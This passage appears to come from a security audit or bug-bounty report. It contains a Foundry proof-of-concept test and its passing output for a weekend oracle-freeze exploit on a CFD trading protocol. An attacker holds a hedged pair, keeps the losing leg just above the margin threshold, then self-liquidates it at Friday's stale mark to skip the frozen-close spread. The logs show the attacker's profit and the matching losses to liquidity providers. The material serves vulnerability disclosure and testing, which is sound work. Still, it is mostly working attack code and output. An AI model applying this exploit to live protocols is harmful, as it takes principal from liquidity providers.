    /// @dev The LONG leg's price loss at Friday's mark (400 USDG per 1,000,000 USDG). Owed on any exit.
    function _lossAtFreezeMark() internal view returns (uint256) {
        return _lots() * (FREEZE_PRICE - OPEN_PRICE);
    }

    /// @dev Carry per hour grows with leg size and with utilization, so the cushion grows with slices squared.
    function _keepAliveBuffer() internal view returns (uint256) {
        return KEEP_ALIVE_BUFFER * slices * slices;
    }

    function _pledge(
        address account
    ) internal view returns (uint256) {
        return clearinghouse.pnlPledgeAssets(account);
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _attackerWealth() internal view returns (uint256) {
        return clearinghouse.balanceAssets(legLong) + clearinghouse.balanceAssets(legShort)
            + clearinghouse.balanceAssets(attackerKeeper);
    }

    /// @dev Pledge at or below which a leg opened at 1.00 is liquidatable at the frozen `mark`: the position is
    ///      valued at the mark shifted against it by 25% of a 10 bps confidence band, and equity must exceed 3% of
    ///      notional (PletherOracle._frozenBasket, PositionRiskAccountingLib.buildExactPriceRiskState).
    function _frozenThreshold(
        CfdTypes.Side side,
        uint256 mark
    ) internal view returns (uint256) {
        uint256 confidence = (mark * pletherOracle.basketMaxConfidenceRatioBps()) / 10_000;
        uint256 shift = (confidence * pletherOracle.adverseConfidenceMultiplierBps()) / 10_000;
        uint256 liquidationPrice = side == CfdTypes.Side.LONG ? mark + shift : mark - shift;
        int256 exitValue = int256(_lots() * liquidationPrice);
        int256 entryCost = int256(_lots() * OPEN_PRICE);
        int256 pnl = side == CfdTypes.Side.LONG ? entryCost - exitValue : exitValue - entryCost;
        return uint256((exitValue * 300) / 10_000 - pnl);
    }

    /// @dev The owner's keep-alive: realize accrued carry with a 1-atom top-up, then restore the pledge to
    ///      `threshold + cushion` if it is below it. Two public CfdEngine.addMargin calls.
    function _keepAlive(
        address account,
        uint256 threshold
    ) internal {
        vm.prank(account);
        engine.addMargin(account, 1);
        uint256 target = threshold + _keepAliveBuffer();
        uint256 current = _pledge(account);
        if (current < target) {
            vm.prank(account);
            engine.addMargin(account, target - current);
        }
    }

    // ------------------------------------------------------------------
    // Friday: open the pair, enter the weekend a hair above the 3% requirement
    // ------------------------------------------------------------------

    function _enterWeekend() internal returns (uint256 thresholdLong) {
        // Pre-attack state (suite helpers): 9M third-party Junior LP on top of the fixture's 1M, funded traders.
        _depositAsync(juniorVault, lp, 9_000_000e6);
        _finishAsyncCooldown(juniorVault, lp);
        _fundTrader(legLong, 60_000e6 * slices);
        _fundTrader(legShort, 60_000e6 * slices);

        vm.warp(FRI_OPEN);
        _refreshMark(OPEN_PRICE);
        attackerStart = _attackerWealth();
        poolStart = pool.totalAssets();
        treasuryStart = clearinghouse.balanceAssets(engine.protocolTreasury());

        // Hedged pair at about 33x (3% is the frozen-market requirement), built in 1,000,000 USDG slices so the
        // book never leans more than one slice to either side.
        for (uint256 i; i < slices; i++) {
            _commitAndExecute(legLong, _request(CfdTypes.Side.LONG, SLICE_SIZE, 32_300e6, false), OPEN_PRICE);
            _commitAndExecute(legShort, _request(CfdTypes.Side.SHORT, SLICE_SIZE, 31_300e6, false), OPEN_PRICE);
        }

        // FAD window (close-only, 3% margin). The basket drifts up 4 bps before the close: the LONG leg loses
        // 4 bps of equity and its owner tops it up to stay just above the requirement; the SHORT leg gains.
        vm.warp(FRI_FAD + 900);
        assertTrue(engine.isFadWindow(), "FAD window");
        thresholdLong = _frozenThreshold(CfdTypes.Side.LONG, FREEZE_PRICE);
        _keepAlive(legLong, thresholdLong);
        _refreshMark(FREEZE_PRICE);

        vm.warp(FRI_FREEZE - 30);
        _refreshMark(FREEZE_PRICE); // last live mark before the close = the weekend mark
        vm.warp(FRI_FREEZE + 60);
        assertTrue(engine.isOracleFrozen(), "oracle frozen");
        assertEq(engine.lastMarkPrice(), FREEZE_PRICE, "weekend mark");
        assertFalse(_tryFrozenLiquidation(legLong, keeper), "LONG leg is above the requirement at the freeze");
        assertFalse(_tryFrozenLiquidation(legShort, keeper), "SHORT leg is above the requirement at the freeze");

        // Weekend: the owner keeps the LONG leg a small cushion above the threshold with an hourly top-up (with
        // one slice: 1.20 USDG, against 0.54 USDG of carry per hour). Nobody can liquidate it meanwhile.
        for (uint256 t = FRI_FREEZE + 1 hours; t <= SUN_DECISION; t += 1 hours) {
            vm.warp(t);
            assertFalse(_tryFrozenLiquidation(legLong, keeper), "LONG leg stays unliquidatable while topped up");
            _keepAlive(legLong, thresholdLong);
        }
        vm.warp(SUN_DECISION);
        assertTrue(engine.isOracleFrozen(), "still frozen on Sunday 18:00 UTC");
        assertEq(engine.lastMarkPrice(), FREEZE_PRICE, "mark is still Friday's");
    }

    // ------------------------------------------------------------------
    // Sunday: three continuations from the same snapshot
    // ------------------------------------------------------------------

    function _closeAfterReopen(
        uint256 reopenPrice
    ) internal returns (Outcome memory o) {
        vm.warp(SUN_REOPEN + 5);
        assertFalse(engine.isOracleFrozen(), "oracle live again");
        _refreshMark(reopenPrice);
        if (_size(legLong) > 0) {
            _commitAndExecute(legLong, _request(CfdTypes.Side.LONG, SLICE_SIZE * slices, 0, true), reopenPrice);
        }
        if (_size(legShort) > 0) {
            _commitAndExecute(legShort, _request(CfdTypes.Side.SHORT, SLICE_SIZE * slices, 0, true), reopenPrice);
        }
        assertEq(_size(legLong) + _size(legShort), 0, "both legs flat");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim left");
        o.attackerPnl = int256(_attackerWealth()) - int256(attackerStart);
        o.lpDelta = int256(pool.totalAssets()) - int256(poolStart);
        o.treasuryFees = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryStart;
    }

    /// @dev Attack: the gap is against the LONG leg, so its owner stops topping it up. Carry takes the pledge
    ///      below the requirement within about two hours and the owner's own keeper account liquidates it at
    ///      Friday's mark. The SHORT leg is closed at the new price after the reopen.
    function _attack(
        uint256 reopenPrice
    ) internal returns (Outcome memory o) {
        uint256 balanceBefore = clearinghouse.balanceAssets(legLong) + clearinghouse.balanceAssets(attackerKeeper);
        uint256 t = SUN_DECISION;
        bool liquidated;
        while (t + 300 < SUN_REOPEN) {
            t += 300;
            vm.warp(t);
            if (_tryFrozenLiquidation(legLong, attackerKeeper)) {
                liquidated = true;
                break;
            }
        }
        assertTrue(liquidated, "losing leg liquidated at the frozen mark before the reopen");
        assertTrue(engine.isOracleFrozen(), "liquidation happened while frozen");
        assertEq(_size(legLong), 0, "losing leg is gone");
        uint256 balanceAfter = clearinghouse.balanceAssets(legLong) + clearinghouse.balanceAssets(attackerKeeper);
        uint256 exitCost = balanceBefore - balanceAfter - _lossAtFreezeMark();
        o = _closeAfterReopen(reopenPrice);
        o.loserExitCost = exitCost;
        o.liquidatedSecondsBeforeReopen = SUN_REOPEN - t;
    }

    /// @dev Control A: no stale exit. Both legs are kept (the LONG leg is topped up) and closed after the reopen.
    function _controlHold(
        uint256 reopenPrice
    ) internal returns (Outcome memory o) {
        vm.prank(legLong);
        engine.addMargin(legLong, 12_000e6 * slices);
        o = _closeAfterReopen(reopenPrice);
    }

    /// @dev Control B: the documented stale exit. The LONG leg is closed voluntarily at Friday's mark and pays
    ///      the 0.50% frozen-close spread to LPs plus the 0.04% execution fee.
    function _controlFrozenClose(
        uint256 reopenPrice
    ) internal returns (Outcome memory o) {
        uint256 balanceBefore = clearinghouse.balanceAssets(legLong);
        _commitAndExecuteFrozen(legLong, _request(CfdTypes.Side.LONG, SLICE_SIZE * slices, 0, true));
        uint256 exitCost = balanceBefore - clearinghouse.balanceAssets(legLong) - _lossAtFreezeMark();
        o = _closeAfterReopen(reopenPrice);
        o.loserExitCost = exitCost;
    }

    function _log(
        string memory label,
        Outcome memory o
    ) internal {
        emit log(label);
        emit log_named_int("  attacker P&L, USDG", o.attackerPnl / 1e6);
        emit log_named_int("  LP pool delta, USDG", o.lpDelta / 1e6);
        emit log_named_uint("  treasury fees, USDG", o.treasuryFees / 1e6);
        if (o.loserExitCost != 0) {
            emit log_named_uint("  cost of leaving the losing leg at Friday's mark (beyond its loss there), USDG", o.loserExitCost / 1e6);
        }
        if (o.liquidatedSecondsBeforeReopen != 0) {
            emit log_named_uint("  liquidated this many seconds before the reopen", o.liquidatedSecondsBeforeReopen);
        }
    }

    function _runGap(
        uint256 gapBps
    ) internal returns (Outcome memory attack, Outcome memory hold, Outcome memory frozenClose) {
        uint256 reopenPrice = FREEZE_PRICE + (FREEZE_PRICE * gapBps) / 10_000; // basket gaps up: LONG loses
        uint256 snap = vm.snapshotState();
        attack = _attack(reopenPrice);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        hold = _controlHold(reopenPrice);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        frozenClose = _controlFrozenClose(reopenPrice);
        vm.revertToState(snap);

        emit log_named_uint("=== weekend gap against the LONG leg, bps", gapBps);
        _log("attack: losing leg liquidated at the frozen mark by its owner", attack);
        _log("control A: both legs held through the reopen", hold);
        _log("control B: losing leg closed voluntarily at the frozen mark (0.50% spread)", frozenClose);
    }

    function test_LiquidationAtFrozenMarkSkipsTheFrozenCloseSpread() public {
        _enterWeekend();
        emit log_named_uint("pool assets at the Sunday snapshot, USDG", pool.totalAssets() / 1e6);
        emit log_named_uint("LONG pledge at the Sunday snapshot, USDG", _pledge(legLong) / 1e6);
        emit log_named_uint("SHORT pledge at the Sunday snapshot, USDG", _pledge(legShort) / 1e6);

        (Outcome memory a30, Outcome memory h30, Outcome memory c30) = _runGap(30);
        (Outcome memory a100, Outcome memory h100, Outcome memory c100) = _runGap(100);

        // 1. Leaving at the stale mark through liquidation costs about one seventh of the voluntary close.
        assertLt(a30.loserExitCost, 800e6, "liquidation exit costs about 7.5 bps of 1,000,000");
        assertGt(c30.loserExitCost, 5_400e6, "voluntary frozen close costs at least spread + fee (54 bps)");

        // 2. A 30 bps gap: the pair profits only through the liquidation exit, and LPs pay for it.
        assertGt(a30.attackerPnl, 0, "attack is profitable at a 30 bps gap");
        assertLt(h30.attackerPnl, 0, "holding the pair is not");
        assertLt(c30.attackerPnl, 0, "the documented stale exit is not");
        assertLt(a30.lpDelta, 0, "LPs lose principal in the attack");
        assertGt(h30.lpDelta, 0, "LPs earn when the pair is held");
        assertGt(c30.lpDelta, 0, "LPs earn when the spread is paid");

        // 3. A 100 bps gap: the liquidation exit takes about 4,650 USDG more from LPs than the priced stale exit.
        assertGt(a100.attackerPnl, c100.attackerPnl + 4_500e6, "attacker keeps the avoided spread");
        assertLt(a100.lpDelta, c100.lpDelta - 4_500e6, "LPs lose the avoided spread on top of the gap");
        assertLt(h100.attackerPnl, 0, "holding the pair is still a loss");
    }

    /// @dev Same attack with 4,000,000 USDG of notional per leg (40% of pool depth).
    function test_SameExitAtFortyPercentOfPoolDepthPerLeg() public {
        slices = 4;
        _enterWeekend();
        emit log_named_uint("pool assets at the Sunday snapshot, USDG", pool.totalAssets() / 1e6);
        emit log_named_uint("leg notional, USDG", (SLICE_SIZE * slices) / 1e18);

        (Outcome memory a100, Outcome memory h100, Outcome memory c100) = _runGap(100);

        assertGt(a100.attackerPnl, 25_000e6, "attacker profit grows with leg notional");
        assertLt(a100.lpDelta, -30_000e6, "LPs lose more than 0.3% of the pool in one weekend");
        assertLt(h100.attackerPnl, 0, "holding the pair is a loss");
        assertLt(a100.lpDelta, c100.lpDelta - 18_000e6, "the avoided spread is 47.5 bps of the dropped leg");
    }

}
```

Output (exit 0):

```
# forge test output (compiler warnings elided)
Ran 2 tests for test/poc/hunt-z-extract/ProofFrozenMarkLiquidationExit.t.sol:ProofFrozenMarkLiquidationExit
[PASS] test_LiquidationAtFrozenMarkSkipsTheFrozenCloseSpread() (gas: 49470246)
Logs:
  pool assets at the Sunday snapshot, USDG: 10002025
  LONG pledge at the Sunday snapshot, USDG: 30670
  SHORT pledge at the Sunday snapshot, USDG: 30300
  === weekend gap against the LONG leg, bps: 30
  attack: losing leg liquidated at the frozen mark by its owner
    attacker P&L, USDG: 496
    LP pool delta, USDG: -1697
    treasury fees, USDG: 1201
    cost of leaving the losing leg at Friday's mark (beyond its loss there), USDG: 751
    liquidated this many seconds before the reopen: 2700
  control A: both legs held through the reopen
    attacker P&L, USDG: -2659
    LP pool delta, USDG: 1056
    treasury fees, USDG: 1602
  control B: losing leg closed voluntarily at the frozen mark (0.50% spread)
    attacker P&L, USDG: -4654
    LP pool delta, USDG: 3053
    treasury fees, USDG: 1601
    cost of leaving the losing leg at Friday's mark (beyond its loss there), USDG: 5902
  === weekend gap against the LONG leg, bps: 100
  attack: losing leg liquidated at the frozen mark by its owner
    attacker P&L, USDG: 7496
    LP pool delta, USDG: -8700
    treasury fees, USDG: 1204
    cost of leaving the losing leg at Friday's mark (beyond its loss there), USDG: 751
    liquidated this many seconds before the reopen: 2700
  control A: both legs held through the reopen
    attacker P&L, USDG: -2672
    LP pool delta, USDG: 1063
    treasury fees, USDG: 1608
  control B: losing leg closed voluntarily at the frozen mark (0.50% spread)
    attacker P&L, USDG: 2345
    LP pool delta, USDG: -3949
    treasury fees, USDG: 1604
    cost of leaving the losing leg at Friday's mark (beyond its loss there), USDG: 5902

[PASS] test_SameExitAtFortyPercentOfPoolDepthPerLeg() (gas: 49879095)
Logs:
  pool assets at the Sunday snapshot, USDG: 10002403
  leg notional, USDG: 4000000
  === weekend gap against the LONG leg, bps: 100
  attack: losing leg liquidated at the frozen mark by its owner
    attacker P&L, USDG: 29346
    LP pool delta, USDG: -34164
    treasury fees, USDG: 4816
    cost of leaving the losing leg at Friday's mark (beyond its loss there), USDG: 3019
    liquidated this many seconds before the reopen: 2700
  control A: both legs held through the reopen
    attacker P&L, USDG: -17457
    LP pool delta, USDG: 11022
    treasury fees, USDG: 6433
  control B: losing leg closed voluntarily at the frozen mark (0.50% spread)
    attacker P&L, USDG: 2752
    LP pool delta, USDG: -9171
    treasury fees, USDG: 6417
    cost of leaving the losing leg at Friday's mark (beyond its loss there), USDG: 29613

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 117.95ms (214.81ms CPU time)

Ran 1 test suite in 118.87ms (117.95ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
exit 0
```

